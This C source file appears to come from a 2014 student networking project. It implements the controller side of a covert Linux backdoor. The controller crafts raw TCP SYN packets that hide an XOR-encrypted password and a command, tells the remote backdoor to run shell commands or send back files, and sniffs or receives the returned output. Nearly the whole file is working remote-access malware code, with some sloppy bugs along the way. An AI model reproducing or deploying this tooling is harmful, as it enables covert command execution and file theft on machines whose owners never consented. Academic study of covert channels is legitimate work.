/*---------------------------------------------------------------------------------------
--      Source File:            backdoor.c
--
--      Functions:              main()
--								void sendPasswordToBackdoor(void *, char*);
--								int sendCommands(int, char*);
--								unsigned int host_convert(char *);
--								unsigned short in_cksum(unsigned short *, int);
--								char * resolve_host (const char *);
--								char * GetIPAddress (void);
--								void usage (char **argv);
--
--
--      Date:                   October 6, 2014
--
--      Revisions:              (Date and Description)
--                                      
--      Designer:               Cole Rees and David Tran
--                              
--      Programmer:             Cole Rees and David Tran
--
--		This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor 
-- 		on a Linux machine that will take command line commands from an external controller and then 
-- 		return the results to the controller. The backdoor will only respond to the controller that 
-- 		supplies it with the correct password.
--
--
--      To compile the application:
--                      
--            	make clean
--				make
-- 
--	To run the application:
--	
--		./controller -s <Source IP Address> -p <Source Port> -d <Destination IP Address> -q <Destination Port> -c <Command To Run>
--
---------------------------------------------------------------------------------------*/
#include "controller.h"

int main(int argc, char *argv[])
{
	AddrInfo Addr_Ptr;
	char*	commandToRun = NULL;
	int 	opt;
	char 	commandData[PATH_MAX];
	char *temp = NULL;
	
	if (argc < 2)
	{
		usage(argv);
	}
	
     // Change the UID/GID to 0 (raise to root)
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        return -1;
    }
    
    get_controller_config("controller.conf", &Addr_Ptr);
    
	//Get our operator that have been passed in
	while ((opt = getopt(argc, argv, COPTIONS)) != -1)
	{
		switch (opt)
		{
			case 'c':
				commandToRun = optarg;
				break;
			
			default:
				case '?':
					usage(argv);
		}
	}
	
	if (commandToRun == NULL) {
		usage (argv);
	}
	printf("%s\n",commandToRun);
	
	if (strcmp(commandToRun, CMDLINE) == 0)
	{
		printf("Please input a command line argument to run: ");
		if (fgets(commandData, PATH_MAX, stdin) != NULL)
		{
			// Remove the newline character if it exists
			if ((temp = strchr(commandData, '\n')) != NULL)
				*temp = '\0';
		}
		printf("You entered: %s\n", commandData);
		
	}
	else if (strcmp(commandToRun, GETFILE) == 0)
	{
		printf("Please input file to get: ");
		if (fgets(commandData, PATH_MAX, stdin) != NULL)
		{
			// Remove the newline character if it exists
			if ((temp = strchr(commandData, '\n')) != NULL)
				*temp = '\0';
		}
		printf("You entered: %s\n", commandData);
		
	} else 
	{
		usage(argv);
	}

	sendPasswordToBackdoor(&Addr_Ptr, commandToRun, commandData);
	return 0;
}

void sendPasswordToBackdoor(AddrInfo *addr_ptr, char *command, char *commandData) 
{
	char *packetBuf = NULL;
    char *commandBuffer = NULL;
    AddrInfo *UserAddr = (AddrInfo *)addr_ptr;
    int sock = 0;
    int one = 1;
    int packetLength = 0;
    int length = 0;
    const int *val = &one;
    struct iphdr *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct sockaddr_in sin;
    struct sockaddr_in din;
    char *encryptedPass = NULL;
    char *encryptedCmd = NULL;
    char *key = NULL;
    char *pass = NULL;

    packetLength = strnlen(commandData, PATH_MAX);
    packetBuf = malloc(sizeof(struct ip) + sizeof(struct tcphdr) + packetLength + 3);
    commandBuffer = malloc(sizeof(char) * (packetLength + 3));

    //Compute Packet length
    packetLength += sizeof(struct ip) + sizeof(struct tcphdr) + 3;
    iph = (struct iphdr *) packetBuf;
    tcph = (struct tcphdr *) (packetBuf + sizeof(struct ip));
    
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(UserAddr->sport);
    din.sin_port = htons(UserAddr->dport);
    sin.sin_addr.s_addr = inet_addr((UserAddr->SrcHost));
    din.sin_addr.s_addr = inet_addr((UserAddr->DstHost));
  
    memset(packetBuf, 0, packetLength);
    
    //IP
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = packetLength;
    iph->id = htonl(rand()%65354);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = din.sin_addr.s_addr;

    //TCP
    tcph->source = htons(UserAddr->sport);
    tcph->dest = htons(UserAddr->dport);
    
    //Add encrypted password to packet
    key = strdup(encryptKey);
    pass = strdup(password);
    encryptedPass = xor_encrypt(key, pass, 4);
    memcpy(packetBuf + sizeof(struct ip) + 4, encryptedPass, sizeof(unsigned long));
    
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(32767);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    if (strcmp(command, CMDLINE) == 0) {
		commandBuffer[0] = '1';
		commandBuffer[1] = '|';
		commandBuffer[2] = '\0';
	} else if (strcmp(command, GETFILE) == 0){
		commandBuffer[0] = '2';
		commandBuffer[1] = '|';
		commandBuffer[2] = '\0';
	} else {
		return;
	}

    //Add the command data with the command
    strncat(commandBuffer, commandData, PATH_MAX + 2);
    
    // Encrypt and copy the command into the packet
    length = strnlen(commandBuffer, PATH_MAX) + 1;
    encryptedCmd = xor_encrypt(key, commandBuffer, length);
    memcpy(packetBuf + sizeof(struct ip) + sizeof(struct tcphdr), encryptedCmd, length);
     
    iph->check = in_cksum((unsigned short *)packetBuf, 5);

    //Create socket
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        fprintf(stderr, "Create socket fail");
		return;
    }
    
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        fprintf(stderr, "Socket opt fail");
		return;
    }
    
    // Send packet
    if (sendto(sock, packetBuf, iph->tot_len, 0, (struct sockaddr *) &din, sizeof(din)) < 0)
    {
       fprintf(stderr, "Send to fail");
		return;
    }
    //Close
    if (close(sock) == -1)
    {
        fprintf(stderr, "Socekt close fail");
		return;
    }
    //Free our buffers
    free(packetBuf);
    free(commandBuffer);

    //We want to wait for a response from the backdoor now
   // waitForResponse(addr_ptr);
    
    if (strcmp(command, CMDLINE) == 0)
	{
		waitForResponse(addr_ptr);
	}
	else if (strcmp(command, GETFILE) == 0)
	{
		recieveFile(addr_ptr);
	} else 
	{
		return;
	}
	
    return;
}

int waitForResponse(AddrInfo *addr_ptr) {
	pcap_if_t *all_dev, *d; 
    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *cfilter = malloc(sizeof(char) * 512);
   	pcap_t* nic_descr;
   	bpf_u_int32 netp;
    bpf_u_int32 maskp;
    
   	snprintf(cfilter, 512, "src %s and src port %d", addr_ptr->DstHost, addr_ptr->dport);
	
	if (pcap_findalldevs(&all_dev, errbuf) == -1)
    {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return 0;
	}
	
	//Find a suitable nic from the device list
    for (d = all_dev; d; d = d->next)
    {
		if (d->addresses != NULL)
		{
			break;
		}
    }
	// Use pcap to get the IP address and subnet mask of the device 
	pcap_lookupnet (d->name, &netp, &maskp, errbuf);
    	
	// open device for reading 
	nic_descr = pcap_open_live (d->name, BUFSIZ, 0, -1, errbuf);
	if (nic_descr == NULL)
	{ 
		printf("pcap_open_live(): %s\n",errbuf); 
		return 0; 
	}
	
	// We only want traffic from the machine that will be sending inputs
	if (pcap_compile (nic_descr, &fp, cfilter, 0, netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1);
	}
	
	// We only want traffic from the machine that will be sending inputs
	if (pcap_setfilter (nic_descr, &fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}

	// Call pcap_loop(..) and pass in the callback function 
	pcap_loop(nic_descr, -1, packetRecieved, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(nic_descr);
	return 1;
}

//We have recieved a packet from the backdoor lets capture it and display the results
void packetRecieved(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	/* declare pointers to packet headers */
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header; 
	//struct udphdr *udp_header;
	//int len;
	int size_ip;
	char *encryptedData = malloc(sizeof(char) * 4);
	char *deCryptData = malloc(sizeof(char) * 4);
	char *key = NULL;

		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));

			// Print some IP Header Fields
			//printf("Source IP address: %-15s\n", inet_ntoa(*(struct in_addr *)&ip_header->saddr));
			//printf("Dest IP address: %-15s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
			

			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				if(ntohl(tcp_header->ack_seq) == 0) {
				} else {
					return;
				}
				/*printf("TCP Packet");
				printf("Source Port: %d\n", ntohs(tcp_header->source));
				printf("Dest Port: %d\n", ntohs(tcp_header->dest));
				printf("ACK #: %u\n", ntohl(tcp_header->ack_seq));
				printf("SEQ #: %u\n", ntohl(tcp_header->seq));	
				printf ("TCP Flags:\n");
				printf("  URG: %u\n", tcp_header->urg);
				printf("  ACK: %u\n", tcp_header->ack);
				printf("  PSH: %u\n", tcp_header->psh);
				printf("  RST: %u\n", tcp_header->rst);
				printf("  SYN: %u\n", tcp_header->syn);
				printf("  FIN: %u\n", tcp_header->fin);*/
				
				//Get Data
				size_ip = ip_header->ihl*4;
				memcpy(encryptedData, (packet + SIZE_ETHERNET + size_ip + 4), sizeof(__uint32_t));
				key = strdup(encryptKey);
				deCryptData = xor_encrypt(key, encryptedData, 4);
				printf("%s", deCryptData);
				
				
			} else if (ip_header->protocol == IPPROTO_UDP) {
				//udp_header = (struct udphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				/*printf("UDP Packet\n");
				printf("Source Port: %d\n", ntohs(udp_header->source));
				printf("Dest Port: %d\n", ntohs(udp_header->dest));
				printf("Length: %d\n", ntohs(udp_header->len));*/
				//Get Data
				size_ip = ip_header->ihl*4;
				memcpy(encryptedData, (packet + SIZE_ETHERNET + size_ip + 4), sizeof(__uint32_t));
				key = strdup(encryptKey);
				deCryptData = xor_encrypt(key, encryptedData, 4);
				printf("%s", encryptedData);
			} else {
				printf("Not a TCP or UDP packet\n");
			}
		}
		else
		{
			printf("Not an IP packet\n");
		}	
}

int recieveFile(AddrInfo *addr_ptr)
{
	//TCP
	int	new_sd = 0, commandSocket = 0;
	socklen_t client_len;
	struct sockaddr_in client;
	struct sockaddr_in	commandAddr;
	//UDP
	int sockfd,n;
	struct sockaddr_in servaddr,cliaddr;
	socklen_t len;
	char mesg[80];
	//GENERAL
	char *decryptedData = NULL;
    char *key = NULL;
	
	if(strcmp("TCP", PTYPE) == 0) {
		  // Create a stream socket
		if ((commandSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
			fprintf(stderr, "Can't create a socket");
			return -1;
		}
		
		bzero((char *)&commandAddr, sizeof(struct sockaddr_in));
		commandAddr.sin_family = AF_INET;
		commandAddr.sin_port = htons(addr_ptr->dport);
		commandAddr.sin_addr.s_addr = htonl(INADDR_ANY); // Accept connections from any client

		if (bind(commandSocket, (struct sockaddr *)&commandAddr, sizeof(commandAddr)) == -1)
		{
			fprintf(stderr, "Can't bind name to socket");
			return -1;
		}
		
		listen(commandSocket, 5);
		
		client_len = sizeof(client);
		if ((new_sd = accept (commandSocket, (struct sockaddr *)&client, &client_len)) == -1)
		{
			fprintf(stderr, "Can't accept client\n");
			return -1;
		}
		
		while(1)
		{
			ssize_t count;
			char buf[80];
			count = recv(new_sd, buf, sizeof buf, 0);
			if (count == -1) {
				break;
			} else if (count == 0) {
				break;
			} else {
				key = strdup(encryptKey);
				decryptedData = xor_encrypt(key, buf, 80);
				printf("%s",decryptedData);
			}
		}
		
		close(new_sd);
		close(commandSocket);
	} else if(strcmp("UDP", PTYPE) == 0) {
		sockfd=socket(AF_INET,SOCK_DGRAM,0);

		bzero(&servaddr,sizeof(servaddr));
		servaddr.sin_family = AF_INET;
		servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
		servaddr.sin_port=htons(addr_ptr->dport);
		bind(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr));
		for (;;)
		{
			len = sizeof(cliaddr);
			n = recvfrom(sockfd,mesg,80,0,(struct sockaddr *)&cliaddr,&len);
			key = strdup(encryptKey);
			decryptedData = xor_encrypt(key, mesg, 80);
			//mesg[n] = 0;
			printf("%s",decryptedData);
		}
	} else {
		fprintf(stderr, "Can't determine packet type\n");
		return -1;
	}
	return 0;
}


/*
 * This function was taken from Craig Rowland's 1996 article on Covert 
 * Channels titled "Covert Channels in the TCP/IP Protocol Suite"*/
unsigned int host_convert(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	i.s_addr = inet_addr(hostname);
	if(i.s_addr == -1) {
		h = gethostbyname(hostname);
		if(h == NULL) {
			fprintf(stderr, "cannot resolve %s\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
	}
	return i.s_addr;
}

/* Copyright (c)1987 Regents of the University of California.
* All rights reserved.
*
* Redistribution and use in source and binary forms are permitted
* provided that the above copyright notice and this paragraph are
* dupliated in all such forms and that any documentation, advertising 
* materials, and other materials related to such distribution and use
* acknowledge that the software was developed by the University of
* California, Berkeley. The name of the University may not be used
* to endorse or promote products derived from this software without
* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 
* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND 
* FITNESS FOR A PARTICULAR PURPOSE
*/
unsigned short in_cksum(unsigned short *buf, int len) {
	unsigned long sum;
    for (sum = 0; len > 0; len--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

/*-----------------------------------------------------------------------------------------------
--
--	Function:	This function resolves and IP or Hostname supplied by user
--
--	Interface:	char * resolve_host (const char *host)
--
--				const char *host - a pointer to a string containing and IP address
--						   or a hostname. 
--	Returns:	A string containing the IP address 
--
--	Date:		June 3, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	The function receives a string containing an IP address or a hostname and uses the 
--	getaddrinfo function to resolve it into an IP address. The function can resolve 
--	both IPv4 and IPv6 addresses.
-- 	
--	
-------------------------------------------------------------------------------------------------*/

char * resolve_host (const char *host)
{
    struct addrinfo hints, *res;
    int errcode;
    static char addrstr[100];
    void *ptr;

    memset (&hints, 0, sizeof (hints));
    hints.ai_family = PF_UNSPEC;	// Handle IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags |= AI_CANONNAME;
    
    errcode = getaddrinfo (host, NULL, &hints, &res);
    if (errcode != 0)
    {
	perror ("getaddrinfo");
	return NULL;
    }
    
    while (res)
    {
	inet_ntop (res->ai_family, res->ai_addr->sa_data, addrstr, 100);

	switch (res->ai_family)
        {
	    case AF_INET:
	      ptr = &((struct sockaddr_in *) res->ai_addr)->sin_addr;
	    break;
	    case AF_INET6:
	      ptr = &((struct sockaddr_in6 *) res->ai_addr)->sin6_addr;
	    break;
        }
	inet_ntop (res->ai_family, ptr, addrstr, 100);
	printf ("IPv%d address: %s (%s)\n", res->ai_family == PF_INET6 ? 6 : 4,
              addrstr, res->ai_canonname);
	res = res->ai_next;
    }
    return addrstr;
}

/*-----------------------------------------------------------------------------------------------
--
--	Function:	This function gets the IP address bound to an active NIC
--
--	Interface:	char * GetIPAddress (void)
--
--				
--	Returns:	A string containing the IP address bound to the first active NIC 
--
--	Date:		June 3, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	This function uses the pcap_lookupdev to obtain address of the first active NIC.
--	The ioctl function is used to obtain the IP address of the active NIC.
-- 	
--	
-------------------------------------------------------------------------------------------------*/

char * GetIPAddress (void)
{
	pcap_if_t *all_dev, *d;
	int sd;
 	struct sockaddr_in *addrp;
	struct ifreq ifrcopy;
	char *interface, *ip_addr;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 netp;
    bpf_u_int32 maskp;
	
	
	if ((sd = socket( PF_INET, SOCK_DGRAM, 0 )) < 0)
 	{
  		printf("Cannot create socket :%s\n", strerror(errno));
  		return (NULL);
 	}
	
	if (pcap_findalldevs(&all_dev, errbuf) == -1)
    {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return 0;
	}
	
	//Find a suitable nic from the device list
    for (d = all_dev; d; d = d->next)
    {
		if (d->addresses != NULL)
		{
			break;
		}
    }
	// Use pcap to get the IP address and subnet mask of the device 
	pcap_lookupnet (d->name, &netp, &maskp, errbuf);
	// Get the first active NIC
	interface = d->name;
	printf("NIC: %s\n", interface);
	if(interface == NULL)
	{ 
	    fprintf(stderr,"%s\n",errbuf); 
	    exit(1); 
	}

 	memset (&ifrcopy,0,sizeof( struct ifreq ) );
 	strncpy (ifrcopy.ifr_name, interface, IFNAMSIZ); //IFNAMSIZ is defined in "if.h"

 	if( ioctl (sd, SIOCGIFADDR, &ifrcopy) < 0 )
 	{
  		printf("Cannot obtain IP address of '%s' :%s\n", interface, strerror(errno));
  		close(sd);
  		return (NULL);
 	}
 	else
	{
		addrp = (struct sockaddr_in *)&(ifrcopy.ifr_addr);
		ip_addr = inet_ntoa(addrp->sin_addr);
	}
	close(sd);
 	return (ip_addr);
  
}

// Usage Message
void usage (char **argv)
{
      fprintf(stderr, "Usage: %s -s <Source IP Address> -p <Source Port> -d <Destination IP Address> -q <Destination Port> -c <Command To Run>\n", argv[0]);
      fprintf(stderr, "Example: %s -s 192.168.0.15 -p 10022 -d 192.168.0.14 -q 10022 -c ls\n", argv[0]);
      exit(1);
}

